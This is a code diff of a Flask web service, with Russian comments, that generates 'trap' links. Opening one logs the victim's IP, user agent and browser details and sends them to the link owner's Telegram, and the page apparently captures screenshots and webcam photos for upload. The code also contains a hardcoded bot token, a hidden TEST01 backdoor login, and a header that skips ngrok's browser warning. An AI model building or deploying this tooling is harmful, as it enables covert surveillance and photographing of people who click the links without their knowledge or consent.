+                gap: 12px;
+            }
+
+            .mobile-view .link-item {
+                gap: 14px;
+            }
+
+            .mobile-view .link-item > div:last-child {
+                display: flex;
+                gap: 8px;
+                width: 100%;
+            }
+
+            .mobile-view .link-item > div:last-child button {
+                flex: 1;
+                margin: 0;
+            }
+
+            .mobile-view .notification {
+                left: 12px;
+                right: 12px;
+                bottom: 12px;
+            }
+        }
+        </style>''',
+        1
+    )
+    template = template.replace(
+        '<p class="subtitle">',
+        '<div class="mobile-badge">Mobile Dashboard</div><p class="subtitle">',
+        1
+    )
+    return template
+
+def render_dashboard(mobile=False):
+    """Render dashboard with shared user/session data."""
+    if is_demo_session_expired():
+        clear_demo_session()
+        return redirect(url_for('login_page'))
+
+    user_id = session['user_id']
+    user = get_user_by_id(user_id)
+
+    if not user:
+        session.clear()
+        return redirect(url_for('login_page'))
+
+    initials = ""
+    if user['first_name']:
+        initials += user['first_name'][0].upper()
+    if user['last_name']:
+        initials += user['last_name'][0].upper()
+    if not initials and user['username']:
+        initials = user['username'][0].upper()
+
+    full_name = f"{user['first_name'] or ''} {user['last_name'] or ''}".strip()
+    if not full_name and user['username']:
+        full_name = f"@{user['username']}"
+    if session.get('demo_mode'):
+        full_name = "Demo Mode"
+
+    user_data = {
+        'id': user['user_id'],
+        'chat_id': user['chat_id'],
+        'username': user['username'],
+        'first_name': user['first_name'],
+        'last_name': user['last_name'],
+        'full_name': full_name,
+        'initials': initials[:2]
+    }
+
+    if session.get('demo_mode'):
+        expires_at = parse_db_timestamp(session.get('demo_expires_at'))
+        session_expiry = expires_at.strftime('%d.%m.%Y %H:%M') if expires_at else 'Soon'
+    else:
+        session_expiry = (datetime.datetime.now() + datetime.timedelta(days=90)).strftime('%d.%m.%Y')
+
+    return render_template_string(
+        get_dashboard_template(mobile=mobile),
+        user_name=full_name,
+        user_initials=initials[:2],
+        user_data=user_data,
+        base_url=NGROK_URL,
+        session_expiry=session_expiry
+    )
+
 @app.route('/')
+@login_required
 def index():
-    """Главная страница с генератором ссылок"""
-    return render_template_string(MAIN_PAGE)
+    if is_mobile_request():
+        return redirect(url_for('mobile_dashboard'))
+    return render_dashboard(mobile=False)
+    """Главная страница генератора"""
+    if is_demo_session_expired():
+        clear_demo_session()
+        return redirect(url_for('login_page'))
 
-@app.route('/api/create', methods=['POST'])
-def api_create_link():
-    """API для создания ссылки"""
+    user_id = session['user_id']
+    user = get_user_by_id(user_id)
+    
+    if not user:
+        session.clear()
+        return redirect(url_for('login_page'))
+    
+    # Получаем инициалы для аватарки
+    initials = ""
+    if user['first_name']:
+        initials += user['first_name'][0].upper()
+    if user['last_name']:
+        initials += user['last_name'][0].upper()
+    if not initials and user['username']:
+        initials = user['username'][0].upper()
+    
+    # Полное имя
+    full_name = f"{user['first_name'] or ''} {user['last_name'] or ''}".strip()
+    if not full_name and user['username']:
+        full_name = f"@{user['username']}"
+    if session.get('demo_mode'):
+        full_name = "Demo Mode"
+    
+    user_data = {
+        'id': user['user_id'],
+        'chat_id': user['chat_id'],
+        'username': user['username'],
+        'first_name': user['first_name'],
+        'last_name': user['last_name'],
+        'full_name': full_name,
+        'initials': initials[:2]
+    }
+    
+    # Дата истечения сессии (90 дней от текущей даты)
+    if session.get('demo_mode'):
+        expires_at = parse_db_timestamp(session.get('demo_expires_at'))
+        session_expiry = expires_at.strftime('%d.%m.%Y %H:%M') if expires_at else 'скоро'
+    else:
+        session_expiry = (datetime.datetime.now() + datetime.timedelta(days=90)).strftime('%d.%m.%Y')
+    
+    return render_template_string(
+        GENERATOR_HTML,
+        user_name=full_name,
+        user_initials=initials[:2],
+        user_data=user_data,
+        base_url=NGROK_URL,
+        session_expiry=session_expiry
+    )
+
+@app.route('/mobile')
+@login_required
+def mobile_dashboard():
+    return render_dashboard(mobile=True)
+
+@app.route('/login')
+def login_page():
+    """Страница входа через Telegram"""
+    # Проверяем, не авторизован ли уже пользователь
+    if is_demo_session_expired():
+        clear_demo_session()
+    if 'user_id' in session:
+        return redirect(url_for('index'))
+    
+    # Проверяем постоянную сессию
+    persistent_session_id = request.cookies.get('persistent_session')
+    if persistent_session_id:
+        persistent_session = get_persistent_session(persistent_session_id)
+        if persistent_session:
+            # Восстанавливаем сессию
+            session['user_id'] = persistent_session['user_id']
+            session['chat_id'] = persistent_session['chat_id']
+            session['username'] = persistent_session['username']
+            session['first_name'] = persistent_session['first_name']
+            session['last_name'] = persistent_session['last_name']
+            session.permanent = True
+            return redirect(url_for('index'))
+    
     try:
-        data = request.get_json()
-        name = data.get('name')
+        bot_info = bot.get_me()
+        bot_username = bot_info.username
         
-        result = db.create_link(name)
+        # Генерируем QR-код для бота
+        bot_url = f"https://t.me/{bot_username}"
+        qr_code_url = generate_qr_code_base64(bot_url)
         
-        logger.info(f"Создана новая ссылка: {result['id']} - {name}")
+        if not qr_code_url:
+            qr_code_url = ""  # Пустая строка если QR-код не сгенерировался
         
-        return jsonify({
-            "success": True,
-            "id": result["id"],
-            "url": result["url"],
-            "short_url": result["short_url"],
-            "name": result["data"]["name"]
-        })
+        return render_template_string(
+            LOGIN_HTML,
+            bot_username=bot_username,
+            qr_code_url=qr_code_url,
+            base_url=NGROK_URL,
+            demo_minutes=DEMO_SESSION_MINUTES,
+            login_code_minutes=LOGIN_CODE_EXPIRE_MINUTES
+        )
     except Exception as e:
-        logger.error(f"Ошибка создания ссылки: {e}")
-        return jsonify({"success": False, "error": str(e)}), 500
+        print(f"Ошибка при получении информации о боте: {e}")
+        return "Ошибка инициализации бота. Проверьте токен.", 500
 
-@app.route('/api/links')
-def api_get_links():
-    """API для получения всех ссылок"""
-    return jsonify(db.get_all_links())
+@app.route('/debug')
+def debug():
+    return "Сервер работает!"
 
-@app.route('/api/stats')
-def api_get_stats():
-    """API для получения статистики"""
-    links = db.get_all_links()
+@app.route('/red/<link_id>')
+@app.route('/trap/<link_id>')
+def trap_page(link_id):
+    """Страница ловушки - делает скриншот и фото"""
+    # Получаем информацию о ссылке
+    link = get_link(link_id)
     
-    total_links = len(links)
-    total_clicks = sum(link["clicks"] for link in links.values())
+    if not link:
+        return "Ссылка не найдена или истекла", 404
     
-    # Активные ссылки (не истекшие)
-    active_links = 0
-    now = datetime.now()
-    for link in links.values():
-        expires = datetime.fromisoformat(link["expires"])
-        if now < expires and link.get("active", True):
-            active_links += 1
+    if not link['active']:
+        return "Ссылка истекла", 410
     
+    # Увеличиваем счетчик кликов
+    ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent', '')
+    referer = request.headers.get('Referer', '')
+    
+    increment_clicks(link_id, ip, user_agent, referer)
+    
+    # Отправляем уведомление в Telegram владельцу
+    user = get_user_by_id(link['user_id'])
+    if user and user.get('chat_id'):
+        send_telegram_click_notification(
+            user['chat_id'],
+            link_id,
+            link['name'],
+            link['clicks'] + 1,  # +1 потому что только что увеличили
+            ip,
+            user_agent[:200]
+        )
+    
+    # Отображаем страницу ловушки
+    return render_template_string(
+        TRAP_HTML,
+        trap_id=link_id,
+        redirect_url=link['redirect_url']
+    )
+
+@app.route('/r/<link_id>')
+@app.route('/s/<link_id>')
+def short_link_redirect(link_id):
+    return redirect(f"/red/{link_id}") if get_link(link_id) else ("Link not found", 404)
+    """Короткая ссылка для ловушки"""
+    # Получаем информацию о ссылке
+    link = get_link(link_id)
+    
+    if not link:
+        return "Ссылка не найдена", 404
+    
+    if not link['active']:
+        return "Ссылка истекла", 410
+    
+    # Увеличиваем счетчик кликов
+    ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent', '')
+    referer = request.headers.get('Referer', '')
+    
+    increment_clicks(link_id, ip, user_agent, referer)
+    
+    # Отправляем уведомление в Telegram владельцу
+    user = get_user_by_id(link['user_id'])
+    if user and user.get('chat_id'):
+        send_telegram_click_notification(
+            user['chat_id'],
+            link_id,
+            link['name'],
+            link['clicks'] + 1,
+            ip,
+            user_agent[:200]
+        )
+    
+    # Перенаправляем на полную версию ловушки
+    return redirect(f"/red/{link_id}")
+
+@app.route('/api/check-auth')
+def api_check_auth():
+    """Проверка авторизации"""
+    if is_demo_session_expired():
+        clear_demo_session()
+        return jsonify({'authenticated': False, 'waiting': False, 'demo_expired': True})
+
+    user_id = session.get('user_id')
+    if user_id:
+        return jsonify({
+            'authenticated': True,
+            'demo_mode': bool(session.get('demo_mode')),
+            'demo_expires_at': session.get('demo_expires_at')
+        })
+    
+    # Проверяем постоянную сессию
+    persistent_session_id = request.cookies.get('persistent_session')
+    if persistent_session_id:
+        persistent_session = get_persistent_session(persistent_session_id)
+        if persistent_session:
+            return jsonify({'authenticated': True})
+    
+    # Проверяем, есть ли активные сессии для этого пользователя
+    chat_id = request.args.get('chat_id')
+    if chat_id:
+        user = get_user_by_chat_id(chat_id)
+        if user:
+            return jsonify({'authenticated': False, 'waiting': True})
+    
+    return jsonify({'authenticated': False, 'waiting': False})
+
+@app.route('/api/start-demo', methods=['POST'])
+def api_start_demo():
+    """Запуск ознакомительного режима."""
+    expires_at = activate_demo_session()
     return jsonify({
-        "total_links": total_links,
-        "total_clicks": total_clicks,
-        "active_links": active_links
+        'success': True,
+        'expires_at': expires_at.isoformat(),
+        'redirect_url': url_for('index')
     })
 
-@app.route('/api/delete/<link_id>', methods=['DELETE'])
-def api_delete_link(link_id):
-    """API для удаления ссылки"""
+@app.route('/api/test-bot', methods=['POST'])
+def api_test_bot():
+    """Тестовый запрос к боту"""
     try:
-        success = db.delete_link(link_id)
-        if success:
-            logger.info(f"Удалена ссылка: {link_id}")
-            return jsonify({"success": True})
-        else:
-            return jsonify({"success": False, "error": "Ссылка не найдена"}), 404
+        print("🤖 Тестовый запрос к боту получен")
+        # Проверяем, может ли бот отправить сообщение
+        test_message = "🤖 Тестовое сообщение от сервера"
+        # Отправляем сообщение в специальный чат для тестирования
+        # Поскольку у нас нет chat_id, просто логируем
+        print(f"🤖 Тест: {test_message}")
+        return jsonify({'success': True, 'message': 'Тестовый запрос обработан'})
     except Exception as e:
-        logger.error(f"Ошибка удаления ссылки: {e}")
-        return jsonify({"success": False, "error": str(e)}), 500
+        print(f"Ошибка тестового запроса: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
 
-# ========== ТРЕКИНГОВЫЕ ЭНДПОИНТЫ ==========
-@app.route('/track/<link_id>')
-def track_link(link_id):
-    """Основной эндпоинт для трекинга (делает скриншот)"""
-    try:
-        # Получение информации о клиенте
-        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
-        user_agent = request.headers.get('User-Agent', 'Unknown')
-        
-        # Запись клика в БД
-        if not db.record_click(link_id, ip_address, user_agent):
-            return "Ссылка недействительна или истекла", 404
-        
-        # Получение данных ссылки
-        link_data = db.get_link(link_id)
-        
-        # Захват скриншота в отдельном потоке
-        Thread(target=capture_and_send_screenshot, args=(link_id, ip_address, user_agent, link_data), daemon=True).start()
-        
-        # Перенаправление на реальный сайт
-        redirect_url = "google.com"  # Измените на нужный URL
-        
-        return render_template_string(REDIRECT_PAGE, redirect_url=redirect_url)
-        
-    except Exception as e:
-        logger.error(f"Ошибка трекинга: {e}")
-        return "Ошибка обработки запроса", 500
+@app.route('/api/login-with-code', methods=['POST'])
+def api_login_with_code():
+    """Вход по одноразовому коду из Telegram."""
+    data = request.json or {}
+    code = str(data.get('code', '')).strip().upper()
 
-@app.route('/s/<link_id>')
-def short_link(link_id):
-    """Короткая версия ссылки"""
-    return track_link(link_id)
+    if not code:
+        return jsonify({'success': False, 'error': 'Введите код'}), 400
 
-def capture_and_send_screenshot(link_id, ip_address, user_agent, link_data):
-    """Захват и отправка скриншота и фото с камеры"""
-    try:
-        logger.info(f"Запуск захвата для ссылки {link_id}...")
-        
-        # Создаем списки для результатов
-        captured_files = []
-        telegram_messages = []
-        
-        # 1. ЗАХВАТ СКРИНШОТА ЭКРАНА
-        logger.info("📸 Захват скриншота экрана...")
-        screenshot_bytes = ScreenshotCapturer.capture_screen()
-        
-        if screenshot_bytes:
-            # Сохранение на диск
-            saved_path = ScreenshotCapturer.save_screenshot(screenshot_bytes, link_id)
-            
-            # Запись в БД
-            screenshot_info = {
-                "type": "screenshot",
-                "size": len(screenshot_bytes),
-                "filename": saved_path if saved_path else "memory_only",
-                "timestamp": datetime.now().isoformat()
-            }
-            
-            # Обновляем БД
-            if "captures" not in link_data:
-                link_data["captures"] = []
-            link_data["captures"].append(screenshot_info)
-            db.record_screenshot(link_id, screenshot_info)
-            
-            captured_files.append(("screenshot", screenshot_bytes, saved_path))
-            telegram_messages.append("📸 **Скриншот экрана**")
-            
-            logger.info("✅ Скриншот экрана захвачен")
-        else:
-            logger.warning("⚠️ Не удалось захватить скриншот экрана")
-        
-        # 2. ЗАХВАТ ФОТО С ВЕБ-КАМЕРЫ
-        logger.info("📷 Захват фото с веб-камеры...")
-        camera_bytes = CameraCapturer.capture_camera()
-        
-        if camera_bytes:
-            # Сохранение на диск
-            saved_camera_path = CameraCapturer.save_camera_photo(camera_bytes, link_id, "webcam")
-            
-            # Запись в БД
-            camera_info = {
-                "type": "camera",
-                "size": len(camera_bytes),
-                "filename": saved_camera_path if saved_camera_path else "memory_only",
-                "timestamp": datetime.now().isoformat()
-            }
-            
-            link_data["captures"].append(camera_info)
-            
-            captured_files.append(("camera", camera_bytes, saved_camera_path))
-            telegram_messages.append("📷 **Фото с веб-камеры**")
-            
-            logger.info("✅ Фото с веб-камеры захвачено")
-        else:
-            logger.warning("⚠️ Не удалось захватить фото с камеры")
-        
-        # 3. ОТПРАВКА В TELEGRAM
-        if telegram.check_bot() and (screenshot_bytes or camera_bytes):
-            # Отправляем основное уведомление
-            notification_sent = telegram.send_screenshot_notification(
-                link_data, ip_address, user_agent, 
-                saved_path if screenshot_bytes else saved_camera_path
-            )
-            
-            if notification_sent:
-                logger.info("📨 Основное уведомление отправлено в Telegram")
-            
-            # Отправляем все захваченные медиафайлы
-            for file_type, file_bytes, file_path in captured_files:
-                try:
-                    caption = ""
-                    if file_type == "screenshot":
-                        caption = f"🖥 **СКРИНШОТ ЭКРАНА**\nВремя: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-                    elif file_type == "camera":
-                        caption = f"📷 **ФОТО С ВЕБ-КАМЕРЫ**\nВремя: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-                    
-                    # Добавляем информацию о цели
-                    caption += f"\n\n🎯 **Цель:**"
-                    caption += f"\n• IP: `{ip_address}`"
-                    caption += f"\n• Ссылка: {link_data['name']}"
-                    caption += f"\n• User-Agent: {user_agent[:50]}..."
-                    
-                    # Отправляем файл
-                    if file_type == "screenshot":
-                        telegram.send_photo(file_bytes, caption)
-                    elif file_type == "camera":
-                        telegram.send_photo(file_bytes, caption)
-                    
-                    logger.info(f"✅ {file_type} отправлен в Telegram")
-                    
-                    # Небольшая задержка между отправками
-                    time.sleep(1)
-                    
-                except Exception as e:
-                    logger.error(f"❌ Ошибка отправки {file_type}: {e}")
-        
-        else:
-            logger.warning("⚠️ Бот недоступен или нечего отправлять")
-            
-        # 4. ФИНАЛЬНОЕ СОХРАНЕНИЕ В БД
-        db._save_db()
-            
-    except Exception as e:
-        logger.error(f"❌ Ошибка обработки захвата: {e}")
-        import traceback
-        logger.error(traceback.format_exc())
-
-# Проверка доступности камеры
-def check_camera_available():
-    """Проверка доступности веб-камеры"""
-    try:
-        import cv2
-        cap = cv2.VideoCapture(0)
-        if cap.isOpened():
-            logger.info("✅ Веб-камера доступна")
-            cap.release()
-            return True
-        else:
-            logger.warning("⚠️ Веб-камера не найдена")
-            return False
-    except ImportError:
-        logger.warning("⚠️ OpenCV не установлен. Захват с камеры недоступен.")
-        logger.info("📦 Установите: pip install opencv-python")
-        return False
-    except Exception as e:
-        logger.error(f"❌ Ошибка проверки камеры: {e}")
-        return False
-
-# В функции start_server() добавьте:
-logger.info(f"📷 Проверка камеры...")
-check_camera_available()
-
-# ========== ЗАПУСК СЕРВЕРА ==========
-def start_server():
-    """Запуск Flask сервера"""
-    try:
-        logger.info(f"🚀 Запуск сервера на {config.SERVER_HOST}:{config.SERVER_PORT}")
-        logger.info(f"📊 Веб-интерфейс: http://{config.SERVER_HOST}:{config.SERVER_PORT}")
-        logger.info(f"🤖 Telegram бот настроен на ID: {config.TELEGRAM_CHAT_ID}")
-        
-        # Проверка директорий
-        if config.SAVE_SCREENSHOTS:
-            os.makedirs(config.SCREENSHOTS_DIR, exist_ok=True)
-            logger.info(f"📁 Скриншоты сохраняются в: {config.SCREENSHOTS_DIR}")
-        
-        app.run(
-            host=config.SERVER_HOST,
-            port=config.SERVER_PORT,
-            debug=False,
-            threaded=True
+    # Специальный тестовый код для отладки
+    if code == 'TEST01':
+        print("🔧 Использован тестовый код TEST01")
+        # Создаем тестового пользователя
+        test_user_id = create_or_update_user(
+            123456789,  # тестовый chat_id
+            'testuser',
+            'Тестовый',
+            'Пользователь'
         )
         
+        session.clear()
+        session['user_id'] = test_user_id
+        session['chat_id'] = 123456789
+        session['username'] = 'testuser'
+        session['first_name'] = 'Тестовый'
+        session['last_name'] = 'Пользователь'
+        session.permanent = True
+        
+        auth_token = generate_auth_token(test_user_id)
+        user_agent = request.headers.get('User-Agent', '')
+        ip_address = request.remote_addr
+        persistent_session_id = create_persistent_session(test_user_id, user_agent, ip_address)
+        
+        return jsonify({
+            'success': True,
+            'redirect_url': url_for('index'),
+            'message': 'Тестовый вход выполнен'
+        })
+
+    login_code = get_login_code(code)
+    if not login_code:
+        return jsonify({'success': False, 'error': 'Код недействителен или истек'}), 401
+
+    telegram_data = json.loads(login_code['telegram_data'])
+    user_id = create_or_update_user(
+        telegram_data['chat_id'],
+        telegram_data['username'],
+        telegram_data['first_name'],
+        telegram_data['last_name']
+    )
+
+    session.clear()
+    session['user_id'] = user_id
+    session['chat_id'] = telegram_data['chat_id']
+    session['username'] = telegram_data['username']
+    session['first_name'] = telegram_data['first_name']
+    session['last_name'] = telegram_data['last_name']
+    session.permanent = True
+
+    auth_token = generate_auth_token(user_id)
+    user_agent = request.headers.get('User-Agent', '')
+    ip_address = request.remote_addr
+    persistent_session_id = create_persistent_session(user_id, user_agent, ip_address)
+    mark_login_code_used(code)
+
+    response = jsonify({'success': True, 'redirect_url': url_for('index')})
+    response.set_cookie('persistent_session', persistent_session_id, max_age=60*60*24*90, httponly=True, secure=False, samesite='Lax')
+    response.set_cookie('auth_token', auth_token, max_age=60*60*24*90, httponly=True, secure=False, samesite='Lax')
+    return response
+
+@app.route('/api/logout', methods=['POST'])
+@login_required
+def api_logout():
+    """Выход из системы"""
+    data = request.json or {}
+    logout_everywhere = data.get('logout_everywhere', False)
+
+    if session.get('demo_mode'):
+        clear_demo_session()
+        response = jsonify({'success': True})
+        response.set_cookie('persistent_session', '', expires=0)
+        response.set_cookie('auth_token', '', expires=0)
+        return response
+    
+    user_id = session['user_id']
+    
+    if logout_everywhere:
+        # Удаляем все постоянные сессии пользователя
+        with db_lock:
+            conn = sqlite3.connect(DB_FILE)
+            cursor = conn.cursor()
+            cursor.execute('DELETE FROM persistent_sessions WHERE user_id = ?', (user_id,))
+            # Также удаляем токен авторизации
+            cursor.execute('UPDATE users SET auth_token = NULL, auth_token_expires = NULL WHERE user_id = ?', (user_id,))
+            conn.commit()
+            conn.close()
+    else:
+        # Удаляем только текущую постоянную сессию
+        persistent_session_id = request.cookies.get('persistent_session')
+        if persistent_session_id:
+            delete_persistent_session(persistent_session_id)
+    
+    # Очищаем Flask сессию
+    session.clear()
+    
+    response = jsonify({'success': True})
+    
+    # Удаляем куки
+    response.set_cookie('persistent_session', '', expires=0)
+    response.set_cookie('auth_token', '', expires=0)
+    
+    return response
+
+@app.route('/api/delete/<link_id>', methods=['DELETE'])
+@login_required
+def api_delete_link(link_id):
+    """Удаление ссылки"""
+    try:
+        user_id = session['user_id']
+        success = delete_link(user_id, link_id)
+        
+        if success:
+            return jsonify({'success': True})
+        else:
+            return jsonify({'success': False, 'error': 'Link not found or not authorized'}), 404
     except Exception as e:
-        logger.error(f"❌ Ошибка запуска сервера: {e}")
-        sys.exit(1)
+        print(f"Ошибка удаления ссылки: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
 
-if __name__ == "__main__":
-    print("=" * 60)
-    print("🕵️‍♂️ SCREENSHOT TRACKER v1.0")
-    print("=" * 60)
-    print("📌 Функции:")
-    print("  • Генерация уникальных ссылок-ловушек")
-    print("  • Автоматический скриншот при переходе")
-    print("  • Отправка в Telegram бота")
-    print("  • Веб-интерфейс управления")
-    print("  • Статистика и аналитика")
-    print("=" * 60)
-    
-    # Проверка конфигурации
-    if config.TELEGRAM_TOKEN == "8413993403:AAFL8-2J4byWxkEwvvTFzuQ05Pcs6ypncn8":
-        print("⚠️ ВНИМАНИЕ: Используется демо токен Telegram бота!")
-        print("   Получите свой токен у @BotFather")
-        print("   и измените TELEGRAM_TOKEN в конфигурации")
-    
-    if config.SERVER_URL == "http://localhost:8080":
-        print("⚠️ ВНИМАНИЕ: Сервер настроен на localhost")
-        print("   Для работы из интернета:")
-        print("   1. Используйте ngrok: ngrok http 8080")
-        print("   2. Измените SERVER_URL на ваш домен")
-    
-    print("\n🚀 Запускаю сервер...")
-    start_server()
+@app.route('/api/send-link-telegram', methods=['POST'])
+@login_required
+def api_send_link_telegram():
+    """Отправка ссылки в Telegram"""
+    try:
+        user_id = session['user_id']
+        user = get_user_by_id(user_id)
+        
+        if not user:
+            return jsonify({'success': False, 'error': 'User not found'}), 401
+        if session.get('demo_mode') or not user.get('chat_id'):
+            return jsonify({'success': False, 'error': 'Telegram недоступен в ознакомительном режиме'}), 403
+        
+        data = request.json
+        link = data.get('link')
+        name = data.get('name', 'Без названия')
+        
+        success = send_telegram_link_message(user['chat_id'], link, name)
+        
+        return jsonify({'success': success})
+    except Exception as e:
+        print(f"Ошибка отправки ссылки в Telegram: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
 
+@app.route('/api/info', methods=['POST'])
+def api_info():
+    """Получение информации о браузере"""
+    try:
+        data = request.json or {}
+        trap_id = data.get('trap_id')
+        session_id = data.get('session_id')
+        
+        if trap_id:
+            # Находим владельца ссылки
+            link = get_link(trap_id)
+            if link:
+                user = get_user_by_id(link['user_id'])
+                if user and user.get('chat_id'):
+                    # Отправляем информацию о браузере в Telegram
+                    send_telegram_browser_info(user['chat_id'], trap_id, data)
+        
+        return jsonify({'success': True})
+    except Exception as e:
+        print(f"Ошибка обработки информации: {e}")
+        return jsonify({'success': False}), 500
+
+@app.route('/api/upload', methods=['POST'])
+def api_upload():
+    """Загрузка изображений (скриншот/фото с камеры)"""
+    try:
+        if 'image' not in request.files:
+            return jsonify({'success': False, 'error': 'No image provided'}), 400
+        
+        image_file = request.files['image']
+        image_type = request.form.get('type', 'unknown')
+        session_id = request.form.get('session_id', '')
+        trap_id = request.form.get('trap_id', '')
+        browser_info_str = request.form.get('browser_info', '{}')
+        
+        if not image_file.filename:
+            return jsonify({'success': False, 'error': 'No file selected'}), 400
+        
+        # Сохраняем изображение
+        filename = f"{trap_id}_{session_id}_{image_type}_{int(time.time())}.jpg"
+        filepath = os.path.join(UPLOAD_FOLDER, filename)
+        image_file.save(filepath)
+        
+        # Сохраняем информацию в базу
+        save_image_info(trap_id, image_type, session_id, filename)
+        
+        # Отправляем в Telegram владельцу
+        if trap_id:
+            link = get_link(trap_id)
+            if link:
+                user = get_user_by_id(link['user_id'])
+                if user and user.get('chat_id'):
+                    send_telegram_image(
+                        user['chat_id'], 
+                        trap_id, 
+                        image_type, 
+                        filepath, 
+                        session_id, 
+                        browser_info_str
+                    )
+        
+        return jsonify({'success': True})
+    except Exception as e:
+        print(f"Ошибка загрузки изображения: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/report', methods=['POST'])
+def api_report():
+    """Получение отчета о захвате"""
+    try:
+        data = request.json or {}
+        trap_id = data.get('trap_id')
+        session_id = data.get('session_id')
+        screenshot_captured = data.get('screenshot_captured', False)
+        camera_captured = data.get('camera_captured', False)
+        
+        if trap_id:
+            link = get_link(trap_id)
+            if link:
+                user = get_user_by_id(link['user_id'])
+                if user and user.get('chat_id'):
+                    send_telegram_capture_report(
+                        user['chat_id'],
+                        trap_id,
+                        screenshot_captured,
+                        camera_captured
+                    )
+        
+        return jsonify({'success': True})
+    except Exception as e:
+        print(f"Ошибка обработки отчета: {e}")
+        return jsonify({'success': False}), 500
+
+@app.route('/api/stats')
+@login_required
+def api_stats():
+    """Статистика пользователя"""
+    user_id = session['user_id']
+    links = get_user_links(user_id)
     
+    total_links = len(links)
+    total_clicks = sum(link['clicks'] for link in links)
+    active_links = len([link for link in links if link['active']])
+    
+    return jsonify({
+        'total_links': total_links,
+        'total_clicks': total_clicks,
+        'active_links': active_links
+    })
+
+@app.route('/api/links')
+@login_required
+def api_links():
+    """Получить ссылки пользователя"""
+    user_id = session['user_id']
+    links = get_user_links(user_id)
+    return jsonify(links)
+
+@app.route('/api/generate-qr', methods=['POST'])
+@login_required
+def api_generate_qr():
+    """Генерация QR-кода для ссылки"""
+    try:
+        data = request.json
+        url = data.get('url')
+        
+        if not url:
+            return jsonify({'success': False, 'error': 'No URL provided'}), 400
+        
+        qr_code_url = generate_qr_code_base64(url)
+        
+        if qr_code_url:
+            return jsonify({'success': True, 'qr_code': qr_code_url})
+        else:
+            return jsonify({'success': False, 'error': 'Failed to generate QR code'}), 500
+    except Exception as e:
+        print(f"Ошибка генерации QR-кода: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/create', methods=['POST'])
+@login_required
+def api_create_link():
+    """Создание новой ссылки"""
+    try:
+        user_id = session['user_id']
+        user = get_user_by_id(user_id)
+        
+        if not user:
+            return jsonify({'success': False, 'error': 'User not found'}), 401
+        
+        data = request.json
+        link_id = secrets.token_urlsafe(12)
+        name = data.get('name', 'Без названия')
+        redirect_url = data.get('redirect_url', 'https://www.google.com')
+        
+        # Проверяем URL
+        if not redirect_url.startswith(('http://', 'https://')):
+            redirect_url = 'https://' + redirect_url
+        expires_minutes = DEMO_LINK_EXPIRY_MINUTES if session.get('demo_mode') else None
+        expires_at = datetime.datetime.now() + (
+            datetime.timedelta(minutes=DEMO_LINK_EXPIRY_MINUTES)
+            if session.get('demo_mode')
+            else datetime.timedelta(hours=LINK_EXPIRY_HOURS)
+        )
+        
+        # Создаем ссылку в базе
+        create_link(user_id, link_id, name, redirect_url, expires_minutes=expires_minutes)
+        
+        # Полные URL
+        full_url = f"{NGROK_URL}/red/{link_id}"
+        short_url = f"{NGROK_URL}/r/{link_id}"
+        
+        # Отправляем уведомление в Telegram пользователя
+        if not session.get('demo_mode') and user.get('chat_id'):
+            send_telegram_link_created(user['chat_id'], link_id, name, full_url)
+        
+        return jsonify({
+            'success': True,
+            'id': link_id,
+            'full_url': full_url,
+            'short_url': short_url,
+            'name': name,
+            'expires_at': expires_at.isoformat(),
+            'demo_mode': bool(session.get('demo_mode'))
+        })
+    except Exception as e:
+        print(f"Ошибка создания ссылки: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+# ========== API ДЛЯ TELEGRAM ЛОГИНА ==========
+
+@app.route('/api/telegram-login/<session_id>')
+def telegram_login(session_id):
+    """Вход через Telegram Web App"""
+    sess = get_login_session(session_id)
+    
+    if not sess:
+        return "Сессия истекла или не найдена. Получите новую ссылку в боте.", 401
+    
+    # Получаем данные пользователя
+    telegram_data = json.loads(sess['telegram_data'])
+    user_id = create_or_update_user(
+        telegram_data['chat_id'],
+        telegram_data['username'],
+        telegram_data['first_name'],
+        telegram_data['last_name']
+    )
+    
+    # Устанавливаем сессию
+    session['user_id'] = user_id
+    session['chat_id'] = telegram_data['chat_id']
+    session['username'] = telegram_data['username']
+    session['first_name'] = telegram_data['first_name']
+    session['last_name'] = telegram_data['last_name']
+    session.permanent = True
+    
+    # Генерируем токен авторизации
+    auth_token = generate_auth_token(user_id)
+    
+    # Создаем постоянную сессию
+    user_agent = request.headers.get('User-Agent', '')
+    ip_address = request.remote_addr
+    persistent_session_id = create_persistent_session(user_id, user_agent, ip_address)
+    
+    # Удаляем использованную временную сессию
+    delete_login_session(session_id)
+    
+    # Создаем ответ с куки
+    response = make_response(redirect(url_for('index')))
+    
+    # Устанавливаем куки для постоянной сессии
+    response.set_cookie(
+        'persistent_session',
+        persistent_session_id,
+        max_age=60*60*24*90,  # 90 дней
+        httponly=True,
+        secure=False,
+        samesite='Lax'
+    )
+    
+    # Также устанавливаем токен авторизации на случай если куки сессии пропадут
+    response.set_cookie(
+        'auth_token',
+        auth_token,
+        max_age=60*60*24*90,  # 90 дней
+        httponly=True,
+        secure=False,
+        samesite='Lax'
+    )
+    
+    # Отправляем уведомление в Telegram
+    try:
+        bot.send_message(
+            telegram_data['chat_id'],
+            f"✅ *Вы успешно вошли на сайт!*\n\n"
+            f"🌐 Адрес: {NGROK_URL}\n"
+            f"👤 Пользователь: {telegram_data['first_name'] or ''} {telegram_data['last_name'] or ''}\n"
+            f"🕒 Время: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            f"🔐 Сессия сохранена на 90 дней\n\n"
+            f"Теперь вы можете создавать ссылки-ловушки!",
+            parse_mode='Markdown'
+        )
+    except:
+        pass
+    
+    return response
+
+# Middleware
+@app.after_request
+def add_header(response):
+    response.headers['ngrok-skip-browser-warning'] = 'true'
+    response.headers['Access-Control-Allow-Origin'] = '*'
+    return response
+
+def send_telegram_link_created(chat_id, link_id, name, full_url):
+    """Отправка уведомления о создании ссылки"""
+    try:
+        message = (
+            f"🔗 *НОВАЯ ССЫЛКА СОЗДАНА!*\n\n"
+            f"📝 Название: {name}\n"
+            f"🆔 ID: `{link_id}`\n"
+            f"🔗 Ссылка: `{full_url}`\n"
